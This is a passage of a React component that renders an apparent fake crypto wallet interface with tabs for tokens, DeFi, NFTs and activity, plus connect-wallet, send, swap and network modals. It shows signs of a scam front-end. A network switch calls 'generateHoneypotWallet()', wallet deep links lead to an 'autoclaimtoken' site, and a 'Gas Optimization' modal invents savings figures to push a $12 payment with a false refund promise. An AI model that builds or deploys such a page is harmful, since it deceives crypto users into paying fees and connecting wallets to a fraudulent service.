                        <div className="text-white font-medium">{token.symbol}</div>
                        <div className={`text-sm ${token.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
                          {token.change}
                        </div>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-white font-medium">${Math.round(token.usdValue).toLocaleString()}</div>
                      <div className="text-gray-400 text-sm">{token.balance}</div>
                    </div>
                  </div>
                ))}
                
                {walletData.tokens.length === 0 && (
                  <div className="p-8 text-center">
                    <div className="text-gray-400 text-sm">No tokens found</div>
                    <div className="text-gray-500 text-xs mt-1">This account is empty</div>
                  </div>
                )}
              </div>
            )}

            {activeTab === 'DeFi' && (
              <div>
                {walletData.defiPositions.map((position, index) => {
                  const protocolLogos = {
                    'Uniswap V3': 'https://cryptologos.cc/logos/uniswap-uni-logo.png',
                    'Aave': 'https://cryptologos.cc/logos/aave-aave-logo.png',
                    'Compound': 'https://cryptologos.cc/logos/compound-comp-logo.png'
                  };
                  return (
                    <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                      <div className="flex items-center">
                        <img src={protocolLogos[position.protocol]} alt={position.protocol} className="w-8 h-8 rounded-full mr-3" />
                        <div>
                          <div className="text-white font-medium">{position.protocol}</div>
                          <div className="text-gray-400 text-sm">{position.type} • {position.apy} APY</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">{position.value}</div>
                        <div className="text-green-400 text-sm">Earning</div>
                      </div>
                    </div>
                  );
                })}
                
                {walletData.defiPositions.length === 0 && (
                  <div className="p-8 text-center">
                    <div className="text-gray-400 text-sm">No DeFi positions</div>
                    <div className="text-gray-500 text-xs mt-1">Start earning with DeFi protocols</div>
                  </div>
                )}
              </div>
            )}

            {activeTab === 'NFTs' && (
              <div>
                {walletData.nfts.map((nft, index) => {
                  return (
                    <div key={index} className="flex items-center justify-between p-4 hover:bg-gray-800 cursor-pointer border-b border-gray-700">
                      <div className="flex items-center">
                        <img src={nft.image} alt={nft.name} className="w-12 h-12 rounded-lg mr-3 object-cover" />
                        <div>
                          <div className="text-white font-medium">{nft.name}</div>
                          <div className="text-gray-400 text-sm">{nft.collection}</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white font-medium">{nft.value}</div>
                        <div className="text-gray-400 text-sm">Floor</div>
                      </div>
                    </div>
                  );
                })}
                
                {walletData.nfts.length === 0 && (
                  <div className="p-8 text-center">
                    <div className="text-gray-400 text-sm">No NFTs found</div>
                    <div className="text-gray-500 text-xs mt-1">Discover and collect NFTs</div>
                  </div>
                )}
              </div>
            )}

            {activeTab === 'Activity' && (
              <div>
                {activities.map((activity, index) => (
                  <div key={activity.id || index} className="flex items-center space-x-3 p-3 hover:bg-gray-700 rounded-lg cursor-pointer">
                    <div className="w-8 h-8 rounded-full flex items-center justify-center overflow-hidden">
                      <img 
                        src={activity.image || 'https://assets.coingecko.com/coins/images/279/small/ethereum.png'} 
                        alt={activity.type}
                        className="w-full h-full object-cover"
                        onError={(e) => {
                          e.target.src = 'https://assets.coingecko.com/coins/images/279/small/ethereum.png';
                        }}
                      />
                    </div>
                    <div className="flex-1">
                      <div className="text-white font-medium">{activity.type}</div>
                      <div className="text-gray-400 text-sm">{activity.timestamp}</div>
                      {activity.from && <div className="text-gray-500 text-xs">From: {activity.from.slice(0, 10)}...</div>}
                      {activity.to && <div className="text-gray-500 text-xs">To: {activity.to.slice(0, 10)}...</div>}
                      {activity.token && <div className="text-gray-500 text-xs">Token: {activity.token}</div>}
                      {activity.platform && <div className="text-gray-500 text-xs">Platform: {activity.platform}</div>}
                    </div>
                    <div className="text-right">
                      <div className={`font-medium ${
                        activity.balanceChange === 'positive' ? 'text-green-400' : 
                        activity.balanceChange === 'negative' ? 'text-red-400' : 'text-white'
                      }`}>
                        {activity.balanceChange === 'positive' ? '+' : activity.balanceChange === 'negative' ? '-' : ''}${activity.amount.toFixed(2)}
                      </div>
                      <div className="text-green-400 text-sm">{activity.status}</div>
                    </div>
                  </div>
                ))}
                
                {transactions.map((tx) => (
                  <div key={tx.id} className="flex items-center justify-between p-4 border-b border-gray-700">
                    <div className="flex items-center">
                      <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center mr-3">
                        <span className="text-white text-xs">→</span>
                      </div>
                      <div>
                        <div className="text-white font-medium capitalize">{tx.type}</div>
                        <div className="text-gray-400 text-sm">{tx.timestamp}</div>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-white font-medium">{tx.amount}</div>
                      <div className="text-green-400 text-sm">{tx.status}</div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Account Details Modal */}
          {showModal === 'accountDetails' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Select Account</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-3">
                  {accounts.map(account => (
                    <div 
                      key={account.id} 
                      onClick={() => {
                        handleAccountSwitch(account.id);
                        setShowModal(null);
                      }}
                      className="flex items-center justify-between p-3 hover:bg-gray-700 rounded-lg cursor-pointer transition-all"
                    >
                      <div className="flex items-center">
                        <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${account.address}`} alt={`Account ${account.id}`} className="w-8 h-8 rounded-full mr-3" />
                        <div>
                          <div className="text-white font-medium flex items-center">
                            Account {account.id}
                            {account.isActive && <div className="w-2 h-2 bg-green-400 rounded-full ml-2"></div>}
                          </div>
                          <div className="text-gray-400 text-sm">{account.address.slice(0,10)}...{account.address.slice(-4)}</div>
                        </div>
                      </div>
                      <div className="text-right">
                        <div className="text-white text-sm">${Math.round(account.balance).toLocaleString()}</div>
                        <div className="text-gray-400 text-xs">{account.isActive ? 'Active' : account.balance > 0 ? 'Available' : 'Empty'}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}



          {/* Wallet Options Modal */}
          {showModal === 'walletOptions' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                
                {/* Detected Wallets */}
                {detectAvailableWallets().length > 0 && (
                  <div className="mb-4">
                    <div className="text-gray-300 text-sm mb-2">Detected Wallets:</div>
                    {detectAvailableWallets().map((wallet, index) => (
                      <button 
                        key={index}
                        onClick={() => connectWallet(wallet)}
                        className="flex items-center w-full bg-green-600 hover:bg-green-700 p-3 rounded-lg text-white font-semibold mb-2"
                      >
                        <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
                          <span className="text-white font-bold">✓</span>
                        </div>
                        <div>
                          <div>{wallet}</div>
                          <div className="text-xs text-green-200">Ready to connect</div>
                        </div>
                      </button>
                    ))}
                    <div className="border-t border-gray-600 my-4"></div>
                    <div className="text-gray-300 text-sm mb-2">Other Options:</div>
                  </div>
                )}
                
                <div className="space-y-3">
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isMetaMask) {
                        connectWallet('MetaMask');
                      } else {
                        window.open('https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <img 
                      src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
                      alt="MetaMask" 
                      className="w-8 h-8 mr-3"
                    />
                    <div>
                      <div>MetaMask</div>
                      <div className="text-xs text-orange-200">Most popular wallet</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isTrust) {
                        connectWallet('Trust Wallet');
                      } else {
                        window.open('https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <img 
                      src="https://trustwallet.com/assets/images/media/assets/TWT.png" 
                      alt="Trust Wallet" 
                      className="w-8 h-8 mr-3 rounded-lg"
                    />
                    <div>
                      <div>Trust Wallet</div>
                      <div className="text-xs text-blue-200">Mobile-first wallet</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isOKExWallet) {
                        connectWallet('OKX Wallet');
                      } else {
                        window.open('https://www.okx.com/web3', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-green-600 hover:bg-green-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">O</span>
                    </div>
                    <div>
                      <div>OKX Wallet</div>
                      <div className="text-xs text-green-200">Exchange wallet</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      if (window.ethereum && window.ethereum.isCoinbaseWallet) {
                        connectWallet('Coinbase Wallet');
                      } else {
                        window.open('https://www.coinbase.com/wallet', '_blank');
                      }
                    }}
                    className="flex items-center w-full bg-indigo-600 hover:bg-indigo-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-indigo-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">C</span>
                    </div>
                    <div>
                      <div>Coinbase Wallet</div>
                      <div className="text-xs text-indigo-200">Beginner friendly</div>
                    </div>
                  </button>
                  <button 
                    onClick={() => {
                      const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
                      setUserAddress(mockAddress);
                      setShowModal(null);
                      localStorage.setItem('connectedWallet', mockAddress);
                    }}
                    className="flex items-center w-full bg-gray-600 hover:bg-gray-700 p-4 rounded-lg text-white font-semibold"
                  >
                    <div className="w-8 h-8 bg-gray-500 rounded-full mr-3 flex items-center justify-center">
                      <span className="text-white font-bold">+</span>
                    </div>
                    <div>
                      <div>Other Wallet</div>
                      <div className="text-xs text-gray-300">Manual connection</div>
                    </div>
                  </button>
                </div>
                <div className="mt-4 text-center">
                  <p className="text-gray-400 text-sm">Choose your preferred wallet or download one above</p>
                  <p className="text-gray-500 text-xs mt-1">All wallets work with this platform</p>
                </div>
              </div>
            </div>
          )}

          {/* Buy Modal */}
          {showModal === 'buy' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Buy ETH</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <button 
                    onClick={() => handleBuyOption('card')}
                    className="w-full bg-gray-700 hover:bg-gray-600 p-4 rounded-lg text-left transition-all"
                  >
                    <div className="text-white font-semibold mb-2">Buy with card</div>
                    <div className="text-gray-300 text-sm">Purchase ETH directly with your credit card</div>
                  </button>
                  <button 
                    onClick={() => handleBuyOption('bank')}
                    className="w-full bg-gray-700 hover:bg-gray-600 p-4 rounded-lg text-left transition-all"
                  >
                    <div className="text-white font-semibold mb-2">Bank transfer</div>
                    <div className="text-gray-300 text-sm">Lower fees, takes 1-3 business days</div>
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Send Modal */}
          {showModal === 'send' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Send {selectedToken?.symbol || 'ETH'}</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">To Address</label>
                    <input 
                      type="text"
                      value={sendAddress}
                      onChange={(e) => setSendAddress(e.target.value)}
                      placeholder="0x..."
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <div>
                    <label className="block text-gray-300 text-sm mb-2">Amount</label>
                    <input 
                      type="number"
                      value={sendAmount}
                      onChange={(e) => setSendAmount(e.target.value)}
                      placeholder="0.0"
                      className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                    />
                  </div>
                  <button 
                    onClick={() => processTransaction('send', selectedToken, calculateGasFee())}
                    disabled={loading || !sendAddress || !sendAmount}
                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Sending...' : 'Send'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Receive Modal */}
          {showModal === 'receive' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Receive</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="text-center space-y-4">
                  <div className="bg-white p-4 rounded-lg">
                    <div className="w-32 h-32 mx-auto mb-4 rounded-lg overflow-hidden">
                      <img 
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=128x128&data=ethereum:${walletData.address}?value=0.01`}
                        alt="QR Code"
                        className="w-full h-full object-cover"
                        onError={(e) => {
                          e.target.src = `https://chart.googleapis.com/chart?chs=128x128&cht=qr&chl=${walletData.address}`;
                        }}
                      />
                    </div>
                  </div>
                  <div>
                    <div className="text-gray-300 text-sm mb-2">Your wallet address:</div>
                    <div className="bg-gray-700 p-3 rounded-lg flex items-center justify-between">
                      <span className="text-white font-mono text-sm">
                        {walletData.address.slice(0, 20)}...
                      </span>
                      <button 
                        onClick={() => copyToClipboard(walletData.address)}
                        className="text-blue-400 hover:text-blue-300 text-sm"
                      >
                        Copy
                      </button>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Network Selector Modal */}
          {showModal === 'networkSelector' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Select Network</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-3">
                  {[
                    { id: 'ethereum', name: 'Ethereum Mainnet', logo: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png' },
                    { id: 'bsc', name: 'BNB Smart Chain', logo: 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png' },
                    { id: 'polygon', name: 'Polygon Mainnet', logo: 'https://assets.coingecko.com/coins/images/4713/small/matic-token-icon.png' },
                    { id: 'arbitrum', name: 'Arbitrum One', logo: 'https://assets.coingecko.com/coins/images/16547/small/photo_2023-03-29_21.47.00.jpeg' }
                  ].map(network => (
                    <div key={network.id} className="p-4 rounded-lg border border-gray-600 hover:bg-gray-700 cursor-pointer">
                      <div className="flex items-center" onClick={() => {
                        setSelectedNetwork(network.id);
                        setShowModal(null);
                        setTimeout(() => generateHoneypotWallet(), 100);
                      }}>
                        <img src={network.logo} alt={network.name} className="w-8 h-8 rounded-full mr-3" />
                        <div>
                          <div className="text-white font-medium flex items-center">
                            {network.name}
                            {selectedNetwork === network.id && <div className="w-2 h-2 bg-green-400 rounded-full ml-2"></div>}
                          </div>
                          <div className="text-gray-400 text-sm">Connected</div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>

              </div>
            </div>
          )}



          {/* Gas Optimization Modal */}
          {showModal === 'gasOptimization' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Gas Optimization</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-center">
                    <div className="text-orange-400 text-3xl mb-2">⚡</div>
                    <div className="text-white font-semibold mb-2">High Gas Fees Detected</div>
                    <div className="text-gray-300 text-sm mb-4">
                      Current network congestion is causing high gas fees. Enable gas optimization to reduce costs by up to 60%.
                    </div>
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-gray-300 text-sm">Current Gas:</span>
                      <span className="text-red-400 font-semibold">~$45.20</span>
                    </div>
                    <div className="flex justify-between items-center mb-2">
                      <span className="text-gray-300 text-sm">Optimized Gas:</span>
                      <span className="text-green-400 font-semibold">~$18.50</span>
                    </div>
                    <div className="border-t border-gray-600 pt-2 mt-2">
                      <div className="flex justify-between items-center">
                        <span className="text-white font-semibold">You Save:</span>
                        <span className="text-green-400 font-bold">$26.70 (59%)</span>
                      </div>
                    </div>
                  </div>
                  
                  <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
                    <div className="text-blue-300 text-sm font-semibold mb-1">Gas Optimization Features:</div>
                    <div className="text-gray-300 text-xs space-y-1">
                      <div>• Smart gas price prediction</div>
                      <div>• Transaction batching</div>
                      <div>• MEV protection</div>
                      <div>• Priority routing</div>
                    </div>
                  </div>
                  
                  <button 
                    onClick={() => {
                      setShowModal('gasPayment');
                    }}
                    className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold"
                  >
                    Enable Gas Optimization - $12
                  </button>
                  
                  <button 
                    onClick={() => setShowModal(null)}
                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
                  >
                    Continue with High Fees
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Gas Payment Modal */}
          {showModal === 'gasPayment' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Enable Gas Optimization</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="text-center">
                    <div className="text-green-400 text-3xl mb-2">✓</div>
                    <div className="text-white font-semibold mb-2">Optimization Ready</div>
                    <div className="text-gray-300 text-sm">
                      Pay the one-time optimization fee to enable advanced gas management for all future transactions.
                    </div>
                  </div>
                  
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-white font-semibold mb-2">What you get:</div>
                    <div className="text-gray-300 text-sm space-y-1">
                      <div>• Lifetime gas optimization</div>
                      <div>• Up to 60% gas savings</div>
                      <div>• Faster transaction processing</div>
                      <div>• MEV protection included</div>
                      <div>• Works on all networks</div>
                    </div>
                  </div>
                  
                  <button 
                    onClick={() => processTransaction('gas_optimization', null, '0.012')}
                    disabled={loading}
                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Processing...' : 'Pay $12 - Enable Optimization'}
                  </button>
                  
                  <div className="text-gray-400 text-xs text-center">
                    Secure payment • Instant activation • 30-day money back guarantee
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Swap Modal */}
          {showModal === 'swap' && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-white font-bold text-lg">Swap</h3>
                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                </div>
                <div className="space-y-4">
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-gray-300 text-sm mb-2">From</div>
                    <div className="flex items-center justify-between">
                      <input type="number" placeholder="0.0" className="bg-transparent text-white text-xl font-semibold outline-none" />
                      <div className="flex items-center">
                        <img src="https://assets.coingecko.com/coins/images/279/small/ethereum.png" className="w-6 h-6 rounded-full mr-2" />
                        <span className="text-white">ETH</span>
                      </div>
                    </div>
                  </div>
                  <div className="text-center">
                    <button className="text-gray-400 hover:text-white">⇅</button>
                  </div>
                  <div className="bg-gray-700 p-4 rounded-lg">
                    <div className="text-gray-300 text-sm mb-2">To</div>
                    <div className="flex items-center justify-between">
                      <input type="number" placeholder="0.0" className="bg-transparent text-white text-xl font-semibold outline-none" />
                      <div className="flex items-center">
                        <img src="https://assets.coingecko.com/coins/images/325/small/Tether.png" className="w-6 h-6 rounded-full mr-2" />
                        <span className="text-white">USDT</span>
                      </div>
                    </div>
                  </div>
                  <button 
                    onClick={() => processTransaction('swap')}
                    disabled={loading}
                    className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold"
                  >
                    {loading ? 'Swapping...' : 'Swap'}
                  </button>
                </div>
              </div>
            </div>
          )}

          {/* Status Message */}
          {status && (
            <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-gray-800 px-4 py-2 rounded-lg border border-gray-600 z-50">
              <div className="text-center text-sm text-gray-300">{status}</div>
            </div>
          )}
        </div>
      </div>
    </>
  );
}